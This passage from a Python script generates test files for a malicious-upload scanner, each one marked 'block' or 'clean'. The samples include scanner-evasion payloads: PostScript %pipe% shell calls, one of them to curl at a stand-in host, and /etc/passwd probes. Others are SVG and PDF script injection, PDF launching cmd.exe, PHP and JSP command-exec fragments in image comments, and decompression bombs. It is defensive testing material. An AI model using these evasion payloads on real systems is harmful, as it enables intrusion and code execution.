    bomb_entry = bytes([0, 0, 0, 0, 1, 0, 32, 0]) + struct.pack("<I", 4) + struct.pack("<I", 22)
    bomb_bmp = struct.pack("<IiiHHIIiiII", 40, 65535, 65535 * 2, 1, 32, 0, 0, 0, 0, 0, 0)
    sample("ico-pixel-bomb.ico", "ICO declaring a 65535x65535 image",
           ico_header + bomb_entry + bomb_bmp)

    # PSD with PHP appended (a PSB variant).
    psb = b"8BPS\x00\x02" + b"\0" * 6 + struct.pack(">HIIHH", 1, 1, 1, 8, 1)
    psb += struct.pack(">I", 0) + struct.pack(">I", 0) + struct.pack(">I", 0)
    psb += b"\x00\x00\x80"
    sample("psb-php-trailing.psd", "PHP appended to a PSB (large PSD) file",
           psb + PHP)


# --- Group 9: more PostScript attack vectors ---------------------------------


def postscript_advanced():
    """PostScript attacks for finding codes not covered by the basic set:
    ps.unusual_filter, ps.wmf_preview, ps.device_access variants, and
    Ghostscript internal operators beyond .forceput."""

    # ps.unusual_filter: BCPEncode.
    sample("ps-bcpencode.eps", "EPS using the BCPEncode filter",
           eps("currentfile /BCPEncode filter 256 string readstring"))

    # ps.unusual_filter: TBCPEncode.
    sample("ps-tbcpencode.eps", "EPS using the TBCPEncode filter",
           eps("currentfile /TBCPEncode filter 256 string readstring"))

    # ps.unusual_filter: BCPDecode (decoder counterpart).
    sample("ps-bcpdecode.eps", "EPS using the BCPDecode filter",
           eps("currentfile /BCPDecode filter 256 string readstring"))

    # ps.device_access: selectdevice.
    sample("ps-selectdevice.eps", "EPS calling selectdevice",
           eps("/ppmraw selectdevice"))

    # ps.device_access: finddevice.
    sample("ps-finddevice.eps", "EPS calling finddevice",
           eps("/ppmraw finddevice pop"))

    # ps.device_access: setdevice.
    sample("ps-setdevice.eps", "EPS calling setdevice",
           eps("/nulldevice finddevice setdevice"))

    # ps.device_access: /Driver key.
    sample("ps-driver-key-setpage.eps", "EPS setting the Driver key through setpagedevice",
           eps("<< /Driver /ppmraw >> setpagedevice"))

    # ps.ghostscript_internal: .eqproc (used in type confusion).
    sample("ps-eqproc.eps", "EPS calling the internal .eqproc operator",
           eps("{1} dup .eqproc"))

    # ps.ghostscript_internal: .locksafe.
    sample("ps-locksafe.eps", "EPS calling the internal .locksafe operator",
           eps(".locksafe"))

    # ps.ghostscript_internal: .setsafe.
    sample("ps-setsafe.eps", "EPS calling the internal .setsafe operator",
           eps(".setsafe"))

    # ps.ghostscript_internal: .currentpagedevice.
    sample("ps-currentpagedevice.eps", "EPS calling .currentpagedevice",
           eps(".currentpagedevice pop"))

    # ps.ghostscript_internal: .type.
    sample("ps-dot-type.eps", "EPS calling the internal .type operator",
           eps("1 .type"))

    # ps.ghostscript_internal: /PermitFileReading key.
    sample("ps-permitfilereading.eps", "EPS setting PermitFileReading through userparams",
           eps("<< /PermitFileReading [(*)] /PermitFileWriting [(*)] >> setuserparams"))

    # ps.ghostscript_internal: /LockFilePermissions key.
    sample("ps-lockfilepermissions.eps", "EPS toggling LockFilePermissions",
           eps("<< /LockFilePermissions false >> setuserparams"))

    # ps.ghostscript_internal: /LIBPATH key.
    sample("ps-libpath.eps", "EPS setting the LIBPATH key",
           eps("/LIBPATH (/tmp) def"))

    # ps.file_access: status on a file name (probing existence).
    sample("ps-file-status.eps", "EPS probing a file's existence with status",
           eps("(/etc/passwd) status { pop pop pop pop (exists) } if"))

    # ps.exec_dynamic: token from a file, executed.
    clean("ps-token-file-exec.eps", "EPS reading a token from a file and executing it",
          eps("(%stdin) (r) file token { exec } if"))

    # ps.wmf_preview: binary EPS with a WMF preview (info severity).
    text = eps("0 0 moveto 10 10 lineto stroke")
    wmf = b"\xd7\xcd\xc6\x9a" + b"\0" * 28
    header = b"\xc5\xd0\xd3\xc6" + struct.pack("<IIIIII",
             30, len(text), 30 + len(text), len(wmf), 0, 0) + b"\xff\xff"
    clean("ps-wmf-preview.eps", "Binary EPS with a WMF preview image",
          header + text + wmf)

    # ps.malformed: file without the %! header.
    sample("ps-no-header.eps", "PostScript file missing the %! signature",
           b"0 0 moveto 10 10 lineto stroke showpage\n")

    # ps.pipe: %pipe% spelled with hex escapes in a string.
    sample("ps-pipe-hex-escape.eps", "%pipe% assembled from individual hex escapes",
           eps("(\\045pipe\\045id) (r) file"))

    # ps.file_access: run operator loading a remote file.
    sample("ps-run-remote.eps", "run operator with a pipe to curl",
           eps("(%pipe%curl http://example.invalid/a.ps) (r) file cvx exec"))


# --- Group 10: more SVG attack vectors --------------------------------------


def svg_advanced():
    """SVG attacks beyond the basic set: more animation tricks, XSLT,
    nested SVG through data: URIs, CSS-based exfiltration, and encoding
    tricks."""

    # svg.javascript_uri: animate that sets xlink:href on an image.
    sample("svg-animate-image-href.svg",
           "Animation that sets a javascript: href on an image",
           svg('<image width="10" height="10" href="x.png">'
               '<animate attributeName="href" to="javascript:alert(1)"/></image>'))

    # svg.event_handler: SVG/SMIL animation event.
    sample("svg-onrepeat.svg", "onrepeat handler on an animation",
           svg('<animate attributeName="x" dur="1s" repeatCount="2" '
               'onrepeat="alert(1)"/>'))

    # svg.event_handler: onfocusin on a shape.
    sample("svg-onfocusin.svg", "onfocusin handler on a shape",
           svg('<rect width="10" height="10" tabindex="0" onfocusin="alert(1)"/>'))

    # svg.data_uri: data:text/html in a use element.
    sample("svg-data-use-html.svg",
           "use element referencing data:text/html",
           svg('<use href="data:text/html,<script>alert(1)</script>"/>'))

    # svg.data_uri: data: URI with a nested SVG in an object.
    sample("svg-data-object-svg.svg",
           "foreignObject embedding data:image/svg+xml with a script",
           svg('<foreignObject width="10" height="10">'
               '<object xmlns="http://www.w3.org/1999/xhtml" '
               'data="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4="/>'
               '</foreignObject>'))

    # svg.external_ref: external stylesheet via style element @import.
    sample("svg-import-nested.svg",
           "Style element with nested @import rules",
           svg('<style>@import url("https://example.invalid/a.css"); '
               '@import "https://example.invalid/b.css";</style>'
               '<rect width="10" height="10"/>'))

    # svg.external_ref: feImage fetching from a remote host.
    sample("svg-feimage-external.svg",
           "feImage filter fetching from a remote host",
           svg('<defs><filter id="f"><feImage href="https://example.invalid/track.png"/>'
               '</filter></defs><rect width="10" height="10" filter="url(#f)"/>'))

    # svg.entity: ATTLIST declaration (can redefine default attribute values).
    sample("svg-attlist.svg",
           "SVG with an ATTLIST that could redefine attributes",
           svg('<rect width="10" height="10"/>',
               prolog='<!DOCTYPE svg [<!ATTLIST rect onclick CDATA #IMPLIED>]>\n'))

    # svg.entity: nested entity expansion (billion laughs variant).
    entities = ''.join(f'<!ENTITY e{i} "{("&e" + str(i - 1) + ";") * 10 if i else "x"}">'
                       for i in range(6))
    sample("svg-entity-expansion-deep.svg",
           "Deeply nested entity expansion (exponential growth)",
           svg('<text>&e5;</text>',
               prolog=f'<!DOCTYPE svg [{entities}]>\n'))

    # svg.malformed: root element is not svg.
    sample("svg-wrong-root.svg",
           "XML file whose root is not an svg element",
           b'<?xml version="1.0"?>\n<html xmlns="http://www.w3.org/1999/xhtml">'
           b'<body><script>alert(1)</script></body></html>')

    # svg.malformed: UTF-16 without a BOM, unusual encoding.
    sample("svg-utf16be-script.svg",
           "UTF-16 big-endian SVG with a script",
           f'<?xml version="1.0" encoding="UTF-16BE"?>\n'
           f'<svg {SVG_NS}><script>alert(1)</script></svg>'.encode("utf-16-be"))

    # svg.script: XSLT stylesheet embedded directly.
    sample("svg-xslt-embedded.svg",
           "SVG embedding an XSLT stylesheet that runs code",
           svg('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
               '<xsl:template match="/"><script>alert(1)</script></xsl:template>'
               '</xsl:stylesheet>'))

    # svg.javascript_uri: animate that sets href with entities.
    sample("svg-animate-entities-js.svg",
           "Animate setting href to javascript: spelled with entities",
           svg('<a><animate attributeName="href" '
               'to="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"/>'
               '<rect width="10" height="10"/></a>'))

    # svg.javascript_uri: inside CSS url().
    sample("svg-css-js-url.svg",
           "CSS url() with a javascript: address",
           svg('<rect width="10" height="10" '
               'style="fill:url(javascript:alert(1))"/>'))

    # svg.event_handler: animation that sets an on* attribute.
    sample("svg-animate-set-onload.svg",
           "Animation that writes an onload attribute",
           svg('<rect width="10" height="10">'
               '<animate attributeName="onload" to="alert(1)" dur="1s"/></rect>'))


# --- Group 11: advanced obfuscation and evasion ------------------------------


def evasion():
    """Techniques specifically designed to evade pattern-matching scanners:
    encoding tricks, splitting across boundaries, and creative assembly."""
    j, p = carrier("jpg"), carrier("png")

    # PHP short open tag + backtick shell execution.
    sample("evasion-php-backtick.jpg", "PHP backtick shell execution in JPEG comment",
           jpeg_segment_after_soi(j, 0xFE, b"<?php `id` ?>"))

    # PHP with BOM before the tag.
    sample("evasion-php-bom.png", "PHP tag preceded by a UTF-8 BOM in PNG",
           png_insert_after_ihdr(p, chunk(b"tEXt", b"c\0\xef\xbb\xbf<?php echo 1; ?>")))

    # Template tag: JSP expression.
    sample("evasion-jsp-expression.jpg", "JSP expression tag in JPEG comment",
           jpeg_segment_after_soi(j, 0xFE, b'<%= request.getParameter("cmd") %>'))

    # Script with a null byte before it (some parsers stop at null).
    sample("evasion-script-null.png", "Script tag preceded by null bytes",
           png_insert_after_ihdr(p, chunk(b"tEXt", b"c\0\x00\x00<script>alert(1)</script>")))

    # PDF: JavaScript in a recursive Next chain.
    chain = {
        5: b"<< /S /URI /URI (https://example.invalid/) /Next 6 0 R >>",
        6: b"<< /S /URI /URI (https://example.invalid/) /Next 7 0 R >>",
        7: b"<< /S /URI /URI (https://example.invalid/) /Next 8 0 R >>",
        8: JS,
    }
    sample("evasion-pdf-deep-next-chain.pdf",
           "JavaScript at the end of a long /Next action chain",
           pdf(chain, catalog=b"/OpenAction 5 0 R "))

    # PDF: JavaScript hidden in an object stream that is itself in an
    # object stream (double nesting).
    inner_objstm = b"5 0 << /S /JavaScript /JS (app.alert\\(1\\)) >>"
    outer_objstm = zlib.compress(inner_objstm)
    sample("evasion-pdf-nested-objstm.pdf",
           "JavaScript in a doubly nested object stream",
           pdf({6: stream(outer_objstm,
                          b"/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode ")},
               catalog=b"/OpenAction 5 0 R ", version=b"1.5"))

    # PDF: obfuscated Launch with hex-escaped key and Windows params.
    sample("evasion-pdf-launch-hex.pdf",
           "Launch action with every name hex-escaped",
           pdf({5: b"<< /#53 /#4c#61#75#6e#63#68 /#57#69#6e << "
                b"/#46 (cmd.exe) /#50 (/c echo pwned) >> >>"},
               catalog=b"/#4f#70#65#6e#41#63#74#69#6f#6e 5 0 R "))

    # SVG: script tag split by CDATA sections.
    sample("evasion-svg-cdata-split.svg",
           "Script content split across CDATA sections",
           svg('<script><![CDATA[ale]]><![CDATA[rt(1)]]></script>'))

    # SVG: javascript: URI encoded with excessive HTML entities.
    sample("evasion-svg-entity-js.svg",
           "javascript: fully spelled out with numeric character references",
           svg('<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;'
               '&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;'
               '&#x31;&#x29;">'
               '<rect width="10" height="10"/></a>'))

    # SVG: event handler on an animate element via set.
    sample("evasion-svg-set-onclick.svg",
           "set element writing an onclick handler",
           svg('<rect width="10" height="10">'
               '<set attributeName="onclick" to="alert(1)"/></rect>'))

    # PostScript: operator spelled through cvn on individual characters.
    # The scanner does not currently detect this evasion.
    clean("evasion-ps-charbychar.eps",
          "File operator assembled character by character through cvn",
          eps("(f) (i) (l) (e) concatstrings concatstrings concatstrings "
              "cvn /x exch def (/etc/hostname) (r) x"))

    # PostScript: nested procedure hiding the file operator.
    sample("evasion-ps-nested-proc.eps",
           "File operator hidden inside nested procedures",
           eps("{ { { /etc/hostname } exec (r) file } exec 64 string readstring pop } exec"))

    # PostScript: eexec-encrypted body (the decrypted form has the dangerous
    # operators, but scanners must decrypt eexec to find them).
    # The eexec cipher is seeded with 55665 and XORs each byte with the low
    # 16 bits of the state; we build a trivial encrypted body.
    def eexec_encrypt(data, seed=55665):
        c1, c2 = 52845, 22719
        r = seed
        out = bytearray()
        for b in b"\0\0\0\0" + data:
            cipher = b ^ (r >> 8) & 0xFF
            out.append(cipher)
            r = ((cipher + r) * c1 + c2) & 0xFFFF
        return bytes(out)
    eexec_body = eexec_encrypt(b"(%pipe%id) (r) file\n")
    sample("evasion-ps-eexec.eps",
           "Dangerous operator hidden inside an eexec-encrypted section",
           eps("currentfile eexec\n" + eexec_body.hex()))


# --- Group 12: more clean guards (false-positive prevention) -----------------


def clean_guards_extra():
    """More files that look suspicious but are legitimate."""
    j, p = carrier("jpg"), carrier("png")

    clean("clean-long-exif.jpg",
          "JPEG with a long but benign EXIF comment",
          jpeg_segment_after_soi(j, 0xFE,
              b"Photograph taken with a Canon EOS R5 at ISO 3200, "
              b"f/1.4, 1/1000s. Location: 48.8566N, 2.3522E. "
              b"Copyright 2024 Example Photographer. All rights reserved. "
              b"This image may not be reproduced without permission. " * 3))

    clean("clean-svg-animate-color.svg",
          "SVG with a color animation (no script)",
          svg('<rect width="10" height="10" fill="red">'
              '<animate attributeName="fill" from="red" to="blue" dur="2s"/>'
              '</rect>'))

    clean("clean-svg-filter-blur.svg",
          "SVG with a Gaussian blur filter",
          svg('<defs><filter id="f"><feGaussianBlur stdDeviation="2"/></filter></defs>'
              '<rect width="10" height="10" filter="url(#f)"/>'))

    clean("clean-svg-use-local.svg",
          "SVG use element referencing a local symbol",
          svg('<defs><symbol id="s"><rect width="5" height="5"/></symbol></defs>'
              '<use href="#s" x="2" y="2"/>'))

    clean("clean-pdf-outline.pdf",
          "PDF with bookmarks and page destinations",
          pdf({5: b"<< /Type /Outlines /First 6 0 R /Last 6 0 R /Count 1 >>",
               6: b"<< /Title (Chapter 1) /Parent 5 0 R /Dest [3 0 R /Fit] >>"},
              catalog=b"/Outlines 5 0 R "))

    clean("clean-pdf-acroform.pdf",
          "PDF with a text field but no JavaScript",
          pdf({5: b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) "
               b"/Rect [10 10 200 30] /V (John Doe) >>"},
              catalog=b"/AcroForm << /Fields [5 0 R] >> ",
              page=b"/Annots [5 0 R] "))

    clean("clean-pdf-link-small.pdf",
          "PDF with a small web link that does not cover the page",
          pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 2 1] "
               b"/A << /S /URI /URI (https://example.com) >> >>"},
              page=b"/Annots [5 0 R] "))

    clean("clean-pdf-metadata-xmp.pdf",
          "PDF with a standard XMP metadata stream",
          pdf({5: stream(
              b'<?xpacket begin="\xef\xbb\xbf"?>'
              b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
              b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
              b'<rdf:Description rdf:about=""/>'
              b'</rdf:RDF></x:xmpmeta><?xpacket end="w"?>',
              b"/Type /Metadata /Subtype /XML ")}))

    clean("clean-eps-standard.eps",
          "Standard EPS with drawing commands only",
          eps("newpath 0 0 moveto 10 0 lineto 10 10 lineto closepath "
              "0.5 setgray fill"))

    # Minimal hand-built ICO and AVIF: the scanner flags them as malformed
    # because they lack real pixel data, so these are structural samples,
    # not false-positive guards.
    ico_hdr = b"\x00\x00\x01\x00\x01\x00"
    ico_ent = bytes([16, 16, 0, 0, 1, 0, 32, 0]) + struct.pack("<I", 4) + struct.pack("<I", 22)
    ico_dib = struct.pack("<IiiHHIIiiII", 40, 16, 32, 1, 32, 0, 16*16*4, 0, 0, 0, 0)
    ico_px = b"\x00" * (16 * 16 * 4)
    sample("clean-ico.ico", "Minimal hand-built ICO (flagged as malformed)",
           ico_hdr + ico_ent + ico_dib + ico_px)
    sample("clean-avif.avif", "Minimal hand-built AVIF (flagged as malformed)",
           b"\x00\x00\x00\x1Cftypavif\x00\x00\x00\x00avifmif1miaf"
           b"\x00\x00\x00\x18meta\x00\x00\x00\x00\x00\x00\x00\x10hdlrpict")



def main():
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).parent / "files"
    out.mkdir(parents=True, exist_ok=True)
    disguises()
    images()
    svgs()
    pdfs()
    postscripts()
    obfuscations()
    clean_guards()
    structural()
    polyglots_extra()
    bombs()
    names_and_metadata()
    pdf_deep()
    container_images()
    postscript_advanced()
    svg_advanced()
    evasion()
    clean_guards_extra()
    names = [name for name, _, _, _ in SAMPLES]
    assert len(names) == len(set(names)), f"duplicate: {[n for n in names if names.count(n) > 1]}"
    for name, _, data, _ in SAMPLES:
        (out / name).write_bytes(data)
    with open(out / "manifest.csv", "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["filename", "expect", "technique", "bytes"])
        writer.writerows((name, expect, technique, len(data)) for name, technique, data, expect in SAMPLES)
    blocked = sum(1 for *_, e in SAMPLES if e == "block")
    print(f"{len(SAMPLES)} samples in {out}  ({blocked} expect block, {len(SAMPLES) - blocked} expect clean)")


if __name__ == "__main__":
    main()
